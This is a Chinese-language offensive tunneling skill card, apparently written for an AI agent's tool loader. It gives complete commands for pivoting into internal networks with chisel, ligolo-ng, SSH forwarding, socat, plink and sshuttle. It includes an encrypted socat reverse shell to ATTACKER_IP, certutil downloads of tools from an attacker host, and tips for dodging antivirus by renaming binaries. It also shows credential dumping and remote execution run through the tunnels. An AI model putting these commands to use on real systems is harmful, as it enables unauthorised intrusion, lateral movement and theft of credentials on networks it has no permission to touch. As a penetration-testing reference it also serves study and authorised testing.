---
name: 'tunneling-port-forwarding'
description: '隧道和端口转发：chisel/ligolo-ng/ssh -D -R -L/socat relay/plink。多层网络必备。每个场景的完整命令。'
whenToUse: '内网多层网络/端口转发/出站受限时：按决策树选 chisel/ligolo-ng/ssh 隧道方案。'
metadata: { domain: network, tier: T1 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

# 隧道 & 端口转发 — 完整参考

## 核心概念速查

| 方向 | SSH 参数 | 含义 | 场景 |
|------|----------|------|------|
| **Local** | `-L` | 把远程端口**拉**到本地 | 访问内网服务 |
| **Remote** | `-R` | 把本地端口**推**到远程 | 让攻击机访问受害者内网 |
| **Dynamic** | `-D` | 本地起 SOCKS 代理 | 代理链，穿透多层网络 |
| **Jump** | `-J` | 通过跳板机 SSH 到深层主机 | 直连内网 SSH |

---

## 1. Chisel — 多平台隧道工具 (Go)

### 1.1 基础架构

```text
反向模式 (Reverse)：目标主动连接攻击者，攻击者端口映射到目标
  攻击者 ←——— 目标 (出站连接，绕过防火墙)

正向模式 (Forward)：攻击者主动连接目标
  攻击者 ———→ 目标 (需要目标端口可达)
```text

### 1.2 反向 SOCKS 代理（最常用）

```bash
# === 攻击者 (Server) ===
./chisel server -p 8000 --reverse
# 监听 8000 端口，允许客户端注册反向隧道

# === 目标 (Client) ===
./chisel client ATTACKER_IP:8000 R:socks
# 连接到攻击者，在攻击者本地打开 SOCKS5 端口（默认 1080）

# 自定义 SOCKS 端口
./chisel client ATTACKER_IP:8000 R:9050:socks

# === 攻击者使用 SOCKS ===
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn 172.16.1.0/24
proxychains4 impacket-psexec domain/user:pass@172.16.1.10
```text

### 1.3 反向单端口转发

```bash
# 场景：目标可达 MSSQL(1433)，攻击者想连
# === 攻击者 ===
./chisel server -p 8000 --reverse

# === 目标 ===
./chisel client ATTACKER_IP:8000 R:1433:localhost:1433
# 攻击者本地 1433 → 目标 localhost:1433

# 转发到目标可达的其他内网主机
./chisel client ATTACKER_IP:8000 R:1433:192.168.1.50:1433
# 攻击者本地 1433 → 内网 192.168.1.50:1433
```text

### 1.4 正向端口转发

```bash
# 场景：目标已开放 8000，攻击者直接连
# === 目标 (Server) ===
./chisel server -p 8000

# === 攻击者 (Client) ===
./chisel client TARGET_IP:8000 0.0.0.0:8080:127.0.0.1:80
# 攻击者本地 8080 → 目标 127.0.0.1:80（目标本地服务）
```text

### 1.5 多客户端管理

```bash
# 攻击者用不同端口区分不同目标
./chisel server -p 8000 --reverse

# 目标 A
./chisel client ATTACKER:8000 R:1080:socks

# 目标 B (用不同 SOCKS 端口)
./chisel client ATTACKER:8000 R:1081:socks

# proxychains 切换端口即可
```text

### 1.6 Chisel 故障排查

```text
问题：client 连上后立刻断开
→ 检查 --reverse 是否在 server 端指定
→ 检查防火墙是否阻断出站
→ 目标是否有 DNS 解析（用 IP 不要用域名）

问题：SOCKS 通了但 proxychains 超时
→ proxychains 只支持 TCP（nmap -sT，不要 -sS）
→ 加 -Pn 跳过主机发现
→ 内网延迟高，调大 proxychains 超时

问题：目标不能运行二进制
→ 用较小架构（chisel_1.x_linux_386）
→ 或改用 SSH -R（如果 SSH 可用）
```text

---

## 2. Ligolo-ng — 新一代隧道 (TUN 接口)

### 2.1 攻击者端设置

```bash
# === 创建 TUN 接口 (只需一次) ===
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

# === 添加目标网络路由 ===
# 假设目标内网是 10.10.10.0/24
sudo ip route add 10.10.10.0/24 dev ligolo

# 或添加多条
sudo ip route add 172.16.0.0/16 dev ligolo

# === 启动 proxy ===
./proxy -selfcert -laddr 0.0.0.0:11601
# 监听 11601，等待 agent 连接
```text

### 2.2 目标端部署

```bash
# === 目标 (Agent) ===
./agent -connect ATTACKER_IP:11601 -ignore-cert
# 连接成功后，agent 会出现在 proxy 会话列表中
```text

### 2.3 Session 管理

```bash
# === Proxy 控制台命令 ===
ligolo-ng » session              # 列出已连接的 agent
ligolo-ng » session 1            # 选择 session 1
[Agent : user@host] » start      # 启动隧道（关键步骤！）
[Agent : user@host] » stop       # 停止隧道
[Agent : user@host] » info       # 查看 agent 信息
```text

### 2.4 添加监听器（反向端口转发）

```bash
# 在 agent session 中：
[Agent : user@host] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
# 攻击者 0.0.0.0:1234 → 目标 127.0.0.1:80
# 流量通过 ligolo TUN 接口路由

[Agent : user@host] » listener_add --addr 0.0.0.0:3389 --to 192.168.1.10:3389
# 攻击者 3389 → 目标可达内网主机 RDP

[Agent : user@host] » listener_list
[Agent : user@host] » listener_del 0
```text

### 2.5 Ligolo-ng 使用

```bash
# TUN 建立后，直接用原生工具访问内网
# 无需 proxychains！
nmap -sT -p 80,443,445 10.10.10.0/24
xfreerdp /v:10.10.10.50 /u:admin
smbclient -L //10.10.10.10
nxc smb 10.10.10.0/24
```text

### 2.6 Ligolo-ng 故障排查

```text
问题：session 选不了或 start 无效
→ 确认先运行 session 再选编号
→ agent 断开后重新 connect

问题：TUN 路由不通
→ sudo ip link set ligolo up
→ ip route show | grep ligolo 确认路由存在
→ ping 10.10.10.1（内网网关）测试

问题：agent 连不上
→ 检查目标 DNS（用 IP）
→ -ignore-cert 不要忘记
→ 目标出站端口是否被限制
```text

---

## 3. SSH 隧道 — 全能瑞士军刀

### 3.1 Local Forward (-L)：把远程拉回来

```bash
# 语法：ssh -L LOCAL_PORT:TARGET_HOST:TARGET_PORT user@jumphost

# 例1：通过跳板机访问内网 web
ssh -L 8080:192.168.1.100:80 user@10.10.10.5
# 打开 http://localhost:8080 就是内网 192.168.1.100:80

# 例2：多端口转发
ssh -L 8080:db.internal:80 -L 3389:rdp.internal:3389 user@jumphost

# 例3：只监听本地
ssh -L 127.0.0.1:8080:internal:80 user@jumphost
```text

### 3.2 Remote Forward (-R)：把本地暴露给远程

```bash
# 语法：ssh -R REMOTE_PORT:TARGET_HOST:TARGET_PORT user@attacker

# 例1：让攻击机访问目标的内网
# 在目标上执行：
ssh -R 8888:localhost:80 attacker_user@ATTACKER_IP
# 攻击者访问 http://localhost:8888 → 目标的 127.0.0.1:80

# 例2：暴露内网其他主机
ssh -R 1433:192.168.1.50:1433 attacker_user@ATTACKER_IP
# 攻击者 localhost:1433 → 内网 MSSQL

# 例3：反向 SOCKS（需要攻击者 GatewayPorts）
# 目标上：
ssh -R 1080 attacker_user@ATTACKER_IP
# 攻击者配置 GatewayPorts yes，然后 proxychains 用 127.0.0.1:1080
```text

### 3.3 Dynamic SOCKS (-D)：本地 SOCKS 代理

```bash
# 语法：ssh -D LOCAL_PORT user@jumphost

ssh -D 1080 user@10.10.10.5
# 本地 1080 起 SOCKS5
# proxychains4 nmap -sT -Pn 192.168.1.0/24

# 结合 -J 多层跳板
ssh -D 1080 -J user@jumphost1 user@jumphost2
```text

### 3.4 Jump Host (-J)：多层 SSH 跳板

```bash
# 语法：ssh -J user@jumphost user@internal

# 单跳板
ssh -J admin@10.10.10.5 user@192.168.1.100

# 多跳板（链式）
ssh -J user@10.10.10.5,admin@172.16.0.10 root@192.168.1.1

# 带端口
ssh -J user@10.10.10.5:2222 user@internal

# 结合 -D
ssh -D 1080 -J user@10.10.10.5 user@192.168.1.100
```text

### 3.5 后台隧道 (无 TTY)

```bash
# 后台运行，不分配 TTY，不执行命令
ssh -T -N -f -L 8080:internal:80 user@jumphost
# -T: 不分配伪终端
# -N: 不执行远程命令
# -f: 后台运行

# 后台 SOCKS
ssh -T -N -f -D 1080 user@jumphost
```text

### 3.6 密码认证自动化

```bash
# sshpass（无交互密码）
sshpass -p 'P@ssw0rd' ssh -D 1080 user@10.10.10.5

sshpass -p 'P@ssw0rd' ssh -T -N -f -R 8888:localhost:80 user@ATTACKER_IP

# 管道接受 host key
sshpass -p 'P@ssw0rd' ssh -o StrictHostKeyChecking=no -D 1080 user@host
```text

### 3.7 密钥认证

```bash
ssh -i /path/to/id_rsa -D 1080 user@jumphost

ssh -i key -J user@jumphost user@internal
```text

### 3.8 SSH 隧道故障排查

```text
问题：-R 端口攻击者访问不了
→ 检查 /etc/ssh/sshd_config: GatewayPorts yes
→ 重启 sshd: systemctl restart sshd
→ 确认端口：GatewayPorts clientspecified（只绑 127.0.0.1）

问题：连接频繁断开
→ 加保活：-o ServerAliveInterval=60
→ -o ServerAliveCountMax=3

问题：密码 SSH 但目标无 sshpass
→ Python 替代：
  python -c "import pty; pty.spawn('/bin/bash')"
  然后手动 ssh
```text

---

## 4. Socat — 瑞士军刀中继

### 4.1 简单端口转发

```bash
# 将本地 8080 转发到 target:80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.5:80
# fork: 允许多连接
# reuseaddr: 快速重启

# 后台运行
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80 &
```text

### 4.2 反向中继

```bash
# 目标上执行：把攻击者的 4444 中继到目标本地 445
socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444

# 更常用：创建反向 shell 的中继
# 目标1（不能出网 → 目标2（能出网） → 攻击者
# 目标2（中转）：
socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:5555
# 目标1：反弹 shell 到目标2的 4444
```text

### 4.3 SSL 加密包装

```bash
# === 生成证书 ===
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat cert.pem key.pem > combined.pem

# === SSL 监听端 ===
socat OPENSSL-LISTEN:443,fork,cert=combined.pem,verify=0 TCP:10.0.0.1:80
# 443 进入 → 解密 → 转发到 10.0.0.1:80

# === SSL 连接端（目标连接攻击者 SSL）===
socat TCP-LISTEN:445,fork OPENSSL:ATTACKER_IP:443,verify=0
```text

### 4.4 加密反向 Shell 中继

```bash
# 攻击者（SSL 监听）
socat OPENSSL-LISTEN:443,cert=combined.pem,verify=0,fork EXEC:/bin/bash

# 目标（连接 SSL 获得 shell）
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid
# 加密的 bind shell 变体
```text

### 4.5 Socat 故障排查

```text
问题：connection refused
→ 检查防火墙/iptables
→ 确认目标端口有服务在监听

问题：fork 不工作，只能一个连接
→ 确保加了 ,fork 选项

问题：SSL 握手失败
→ verify=0 跳过证书验证
→ 证书文件路径正确
```text

---

## 5. plink.exe — Windows SSH 隧道 (PuTTY)

### 5.1 基本用法

```cmd
REM 下载 plink.exe
certutil -urlcache -f http://ATTACKER_IP/plink.exe plink.exe

REM 反向端口转发（让攻击者连目标 RDP）
plink.exe -P 22 -l user -pw P@ssw0rd -R 3389:127.0.0.1:3389 ATTACKER_IP
```text

### 5.2 非交互接受 Host Key

```cmd
REM 方法1：echo y 管道
echo y | plink.exe -P 22 -l user -pw pass -R 3389:127.0.0.1:3389 ATTACKER_IP

REM 方法2：预先存储 host key
echo 10.10.10.5 ssh-rsa AAAAB3... >> %USERPROFILE%\.ssh\known_hosts

REM 方法3：跳过检查
plink.exe -P 22 -l user -pw pass -hostkey 11:22:33:44:55:66:77:88:99:aa:bb:cc:dd:ee:ff:00 -R 3389:127.0.0.1:3389 ATTACKER_IP
```text

### 5.3 其他转发模式

```cmd
REM SOCKS 代理（攻击者通过目标上网）
plink.exe -P 22 -l user -pw pass -D 1080 ATTACKER_IP

REM Local forward
plink.exe -P 22 -l user -pw pass -L 8080:internal:80 ATTACKER_IP

REM 后台运行（Windows）
start /b plink.exe -P 22 -l user -pw pass -R 3389:127.0.0.1:3389 ATTACKER_IP
```text

### 5.4 plink 故障排查

```text
问题：plink.exe 在 Windows 上被杀软拦
→ 改名或用其他扩展名 (.dat, .log)
→ 用 certutil 下载更隐蔽

问题：host key 弹窗卡住脚本
→ 必须处理 host key（echo y 或 -hostkey）
→ 不然 plink 会阻塞等输入

问题：无 plink 可用
→ 用系统自带 ssh.exe (Win10+)
  ssh -R 3389:127.0.0.1:3389 user@ATTACKER_IP
```text

---

## 6. SSHuttle — 透明 SSH VPN

### 6.1 基本用法

```bash
# 路由指定子网
sshuttle -r user@10.10.10.5 192.168.1.0/24

# 排除某些子网
sshuttle -r user@host 10.0.0.0/8 -x 10.0.1.0/24

# 自动检测远程网络
sshuttle -r user@host --auto-nets

# 指定 DNS 也走隧道
sshuttle --dns -r user@host 10.10.10.0/24
```text

### 6.2 高级选项

```bash
# 用 SSH 密钥
sshuttle -r user@host --ssh-cmd 'ssh -i key' 10.0.0.0/8

# 通过跳板机
sshuttle -r user@host -J jumphost_user@jumphost 10.0.0.0/24

# 排除本地网络
sshuttle -r user@host --auto-nets --exclude 192.168.0.0/16

# 守护进程模式
sshuttle -D -r user@host 10.10.10.0/24
```text

### 6.3 与 proxychains 对比

```text
SSHuttle 优势：透明代理，任意程序可用，支持 UDP（部分），无需改工具
SSHuttle 限制：需要 SSH 访问 + Python + sudo（本地创建 TUN）
Proxychains 优势：无需 sudo，纯用户态
Proxychains 限制：仅 TCP，需要工具适配 proxychains 前缀
```text

### 6.4 SSHuttle 故障排查

```text
问题：sudo 密码弹窗
→ sshuttle 本地需要 root 权限创建 TUN
→ 或预先配好 sudo NOPASSWD

问题：某些流量不通
→ sshuttle 对 UDP 支持有限
→ ICMP 不走隧道（ping 不通正常）
→ 用 nc -v 测试 TCP 连通性

问题：目标没有 Python
→ sshuttle 需要远程 Python 环境
→ 无法使用时退到 SSH -D + proxychains
```text

---

## 7. Proxychains 配置与使用

### 7.1 配置文件 `/etc/proxychains4.conf`

```bash
# 关键配置项
strict_chain                     # 严格链（所有代理串联）
# dynamic_chain                  # 动态链（跳过不可用代理）
# random_chain                   # 随机链

# 代理列表
[ProxyList]
socks5 127.0.0.1 1080            # Chisel SOCKS
# socks4 127.0.0.1 9050          # Tor
# http 10.10.10.5 3128           # HTTP 代理

# 多代理串联（严格链模式）
# [ProxyList]
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```text

### 7.2 常用命令组合

```bash
# Nmap（仅 TCP！）
proxychains4 nmap -sT -Pn -p 80,443,445,3389 172.16.1.0/24
proxychains4 nmap -sT -Pn -p- 172.16.1.10 --open

# Impacket 工具
proxychains4 impacket-psexec domain/user:pass@172.16.1.10
proxychains4 impacket-secretsdump domain/user:pass@172.16.1.10
proxychains4 impacket-wmiexec domain/user:pass@172.16.1.10

# CrackMapExec
proxychains4 nxc smb 172.16.1.0/24 -u user -p pass -d domain

# RDP / VNC
proxychains4 xfreerdp /v:172.16.1.10 /u:admin /p:pass
proxychains4 vncviewer 172.16.1.10

# Web
proxychains4 curl http://172.16.1.10/internal
proxychains4 wget http://172.16.1.10/file.txt
```text

### 7.3 Proxychains 故障排查

```text
问题：proxychains 无输出，直接退出
→ 检查配置文件中代理地址和端口
→ 确认 SOCKS 端口确实在监听 (ss -tlnp)

问题：nmap 结果不完整
→ 必须用 -sT（TCP connect），不能 -sS
→ 必须 -Pn（跳过 host discovery）
→ 代理超时：修改 tcp_read_time_out 和 tcp_connect_time_out

问题：UDP 工具不可用
→ proxychains4 仅支持 TCP
→ DNS 走 UDP 也会失败，用 IP 地址
→ 需要 UDP：考虑 sshuttle 或 ligolo-ng
```text

---

## 8. 常见实战场景

### 场景 1：Web 服务器双网卡，有 MSSQL 在内网

```text
拓扑：攻击者 → 192.168.1.10:80 (目标 web)
              目标 → 10.0.0.50:1433 (内网 MSSQL)

方案 A：Chisel 反向
  攻击者: ./chisel server -p 8000 --reverse
  目标:   ./chisel client ATTACKER:8000 R:1433:10.0.0.50:1433
  攻击者: impacket-mssqlclient user:pass@127.0.0.1 -port 1433

方案 B：SSH 反向（目标有 SSH 出站）
  目标:   ssh -R 1433:10.0.0.50:1433 attacker@ATTACKER_IP
  攻击者: impacket-mssqlclient user:pass@127.0.0.1 -port 1433
```text

### 场景 2：双网卡主机，需要扫描第二层网络

```text
拓扑：攻击者 → 10.10.10.5:22 (边界)
              边界 → 172.16.1.0/24 (内网)

方案 A：Ligolo-ng（推荐，最佳体验）
  攻击者: sudo ip tuntap add user root mode tun ligolo
          sudo ip link set ligolo up
          sudo ip route add 172.16.1.0/24 dev ligolo
          ./proxy -selfcert -laddr 0.0.0.0:11601
  边界:   ./agent -connect ATTACKER:11601 -ignore-cert
  攻击者: session 1 → start
          nmap -sT 172.16.1.0/24
          nxc smb 172.16.1.0/24

方案 B：SSH -D + proxychains
  攻击者: ssh -D 1080 user@10.10.10.5
          proxychains4 nmap -sT -Pn 172.16.1.0/24

方案 C：SSHuttle
  sshuttle -r user@10.10.10.5 172.16.1.0/24
  nmap -sT 172.16.1.0/24   # 无需 proxychains！
```text

### 场景 3：目标只有出站 SSH，无其他工具

```text
拓扑：攻击者监听 22，目标可出站 SSH

方案 A：SSH 反向 SOCKS
  # 攻击者 /etc/ssh/sshd_config:
  #   GatewayPorts yes
  #   PermitTunnel yes
  攻击者: systemctl restart sshd
  目标:   ssh -T -N -f -R 1080 attacker@ATTACKER_IP
  攻击者: proxychains4 nmap -sT -Pn 172.16.0.0/24

方案 B：上传 Chisel 后使用（见场景 1）

方案 C：仅用 SSH 转发特定端口
  目标:   ssh -R 445:172.16.1.10:445 -R 3389:172.16.1.5:3389 attacker@ATTACKER_IP
  攻击者: smbclient -L //127.0.0.1
          xfreerdp /v:127.0.0.1:3389
```text

### 场景 4：多层内网（跳板→跳板→目标）

```text
拓扑：攻击者 → 10.10.10.5 (跳板1) → 172.16.1.10 (跳板2) → 192.168.1.0/24

方案：SSH -J 多跳 + -D
  攻击者: ssh -D 1080 -J user1@10.10.10.5 user2@172.16.1.10
          proxychains4 nmap -sT -Pn 192.168.1.0/24

方案：Chisel 串联
  攻击者: ./chisel server -p 8000 --reverse
  跳板1:  ./chisel client ATTACKER:8000 R:1080:socks  # 第一段 SOCKS
  # 通过 proxychains+跳板1 SOCKS 把 chisel 传到跳板2
  跳板2:  proxychains4 ./chisel client ATTACKER:8000 R:1081:socks  # 第二段
  # 现在 proxychains 配 1081 就能到最深层
```text

### 场景 5：纯 Windows 环境

```text
方案：plink.exe 或系统自带 ssh.exe
  # Windows 10+ 自带 OpenSSH
  ssh -R 3389:127.0.0.1:3389 attacker@ATTACKER_IP

  # 或下载 plink
  certutil -urlcache -f http://ATTACKER/plink.exe plink.exe
  echo y | plink.exe -pw pass -R 3389:127.0.0.1:3389 user@ATTACKER_IP

场景：目标 RDP 到内网
  攻击者 → 目标(Windows,双网卡) → 内网 RDP
  目标: ssh -R 3389:192.168.1.10:3389 attacker@ATTACKER_IP
  攻击者: xfreerdp /v:127.0.0.1:3389 /u:admin /p:pass
```text

---

## 9. 隧道中传输文件

### 9.1 Base64 编码（无额外工具）

```bash
# 通过已有 SSH 会话传文件
# 源端
cat file | base64 -w0 | xclip -sel clipboard
# 或显示后手动复制
base64 -w0 file

# 目标端
echo "BASE64_STRING" | base64 -d > file

# Windows
certutil -encode file encoded.txt
certutil -decode encoded.txt file
```text

### 9.2 Python HTTP（配合隧道）

```bash
# 在内网主机起 HTTP server
# 通过 SSH 或 Chisel 隧道后从攻击者访问

# 内网主机：
python3 -m http.server 8000

# 攻击者通过隧道下载
proxychains4 curl http://172.16.1.50:8000/chisel -o chisel
proxychains4 wget http://192.168.1.100:8000/nc.exe
```text

### 9.3 SCP 跳板传送

```bash
# 通过跳板机传文件到内网
scp -J jumpuser@10.10.10.5 localfile user@192.168.1.100:/path/

# 从内网拉文件
scp -J jumpuser@10.10.10.5 user@192.168.1.100:/path/file ./localfile

# 多层跳板
scp -o 'ProxyJump user1@10.10.10.5,user2@172.16.1.10' file user3@192.168.1.1:/tmp/
```text

### 9.4 Netcat 通过隧道

```bash
# 攻击者监听（通过 Socat 中继）
socat TCP-LISTEN:9999,fork TCP:127.0.0.1:1081 &
# 目标发送
nc -w 3 ATTACKER_IP 9999 < file
```text

---

## 10. 工具选择决策树

```text
目标有 SSH 出站？
├─ YES → SSH -D（简单）/ SSHuttle（透明）/ SSH -R（端口转发）
│         ├─ 需要透明代理？ → SSHuttle
│         ├─ 只需特定端口？ → SSH -L / -R
│         └─ 需要 SOCKS？   → SSH -D
│
├─ NO → 能传文件上目标？
│        ├─ YES → Chisel / Ligolo-ng
│        │         ├─ 需要完整网络访问？ → Ligolo-ng（TUN 接口）
│        │         └─ 快速端口转发？     → Chisel
│        │
│        └─ NO → 目标有什么现成工具？
│                 ├─ socat  → socat relay
│                 ├─ nc     → nc relay
│                 ├─ python → python socket relay
│                 └─ 无     → 寻找 RCE/LFI 上传
│
└─ 多层网络？
   ├─ SSH -J 链式跳板
   ├─ Ligolo-ng（天然支持多层路由）
   └─ Chisel 串联 SOCKS
```text

---

## 11. 快速参考卡片

```bash
# ============ Chisel ============
# 反向 SOCKS（最常用）
攻击者: ./chisel server -p 8000 --reverse
目标:   ./chisel client ATTACKER:8000 R:socks
使用:   proxychains4 <tool>

# ============ Ligolo-ng ==========
# 透明代理（最强大）
攻击者: sudo ip tuntap add user root mode tun ligolo
        sudo ip link set ligolo up
        sudo ip route add NET/SUBNET dev ligolo
        ./proxy -selfcert -laddr 0.0.0.0:11601
目标:   ./agent -connect ATTACKER:11601 -ignore-cert
使用:   session → start → 原生工具直连

# ============ SSH ============
# SOCKS 代理
ssh -D 1080 user@jumphost

# 跳板机
ssh -J user@jumphost user@internal

# 后台反向
ssh -T -N -f -R 8888:localhost:80 user@attacker

# 透明 VPN
sshuttle -r user@host NETWORK/SUBNET

# ============ Socat ============
socat TCP-LISTEN:PORT,fork TCP:TARGET:PORT

# ============ Proxychains ============
proxychains4 nmap -sT -Pn TARGET
proxychains4 nxc smb TARGET
```text

---

## 附录：常见端口号参考

| 端口 | 用途 | 常用转发场景 |
|------|------|-------------|
| 80/443 | Web | 内网 Web 管理界面 |
| 445 | SMB | 内网文件共享、CrackMapExec |
| 3389 | RDP | 内网远程桌面 |
| 1433 | MSSQL | 数据库查询 |
| 3306 | MySQL | 数据库 |
| 5985/5986 | WinRM | PowerShell Remoting |
| 389/636 | LDAP(S) | 域控信息收集 |
| 88 | Kerberos | 域认证 |
| 135 | RPC | Windows RPC |
| 139 | NetBIOS | 旧版 Windows 共享 |
| 8080/8443 | Web Proxy | 常见内网管理面板 |
| 27017 | MongoDB | NoSQL 数据库 |
| 5432 | PostgreSQL | 数据库 |
